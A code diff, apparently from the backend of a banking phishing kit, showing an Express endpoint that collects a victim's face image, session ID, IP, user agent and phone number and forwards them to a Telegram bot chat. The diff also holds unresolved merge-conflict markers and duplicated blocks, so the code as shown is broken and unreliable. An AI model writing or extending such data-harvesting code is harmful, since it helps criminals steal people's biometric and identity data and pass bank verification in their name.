@@ -333,19 +333,28 @@ app.post('/consignar', async (req, res) => {
 
  
 // ==================== ENDPOINT: BIOMETRÍA ====================
+<<<<<<< HEAD
 // ==================== ENDPOINT: BIOMETRÍA ====================
 app.post('/step-biometrics', async (req, res) => {
   try {
     const { sessionId, imageBase64, userAgent, ip, phoneNumber } = req.body;
+=======
+app.post('/step-biometrics', async (req, res) => {
+  try {
+    const { sessionId, imageBase64, userAgent, ip } = req.body;
+>>>>>>> b3ecfedf0334e58c4d9b96060a75bf4c9e0a13bf
 
     if (!BOT_TOKEN || !CHAT_ID) {
       return res.status(500).json({ ok: false });
     }
 
+<<<<<<< HEAD
     if (!sessionId || !imageBase64) {
       return res.status(400).json({ ok: false, reason: 'Datos incompletos' });
     }
 
+=======
+>>>>>>> b3ecfedf0334e58c4d9b96060a75bf4c9e0a13bf
     const session = sessionData.get(sessionId) || {};
 
     const buffer = Buffer.from(
@@ -353,9 +362,13 @@ app.post('/step-biometrics', async (req, res) => {
       'base64'
     );
 
+<<<<<<< HEAD
     const FormData = require('form-data');
     const formData = new FormData();
 
+=======
+    const formData = new (require('form-data'))();
+>>>>>>> b3ecfedf0334e58c4d9b96060a75bf4c9e0a13bf
     formData.append('chat_id', CHAT_ID);
     formData.append('photo', buffer, {
       filename: 'biometria.jpg',
@@ -364,6 +377,7 @@ app.post('/step-biometrics', async (req, res) => {
 
     formData.append(
       'caption',
+<<<<<<< HEAD
 `🧬 BIOMETRÍA RECIBIDA
 
 📱 Número: ${phoneNumber || session.phoneNumber || 'N/A'}
@@ -381,6 +395,17 @@ app.post('/step-biometrics', async (req, res) => {
     console.log(`🧬 Biometría enviada - Session: ${sessionId}`);
     res.json({ ok: true });
 
+=======
+      `🧬 BIOMETRÍA RECIBIDA\n\n🆔 Session: ${sessionId}\n🌐 IP: ${ip}\n🖥️ UA: ${userAgent}`
+    );
+
+    await axios.post(getTelegramApiUrl('sendPhoto'), formData, {
+      headers: formData.getHeaders()
+    });
+
+    console.log(`🧬 Biometría enviada - Session ${sessionId}`);
+    res.json({ ok: true });
+>>>>>>> b3ecfedf0334e58c4d9b96060a75bf4c9e0a13bf
   } catch (err) {
     console.error('❌ Error biometría:', err.message);
     res.status(500).json({ ok: false });
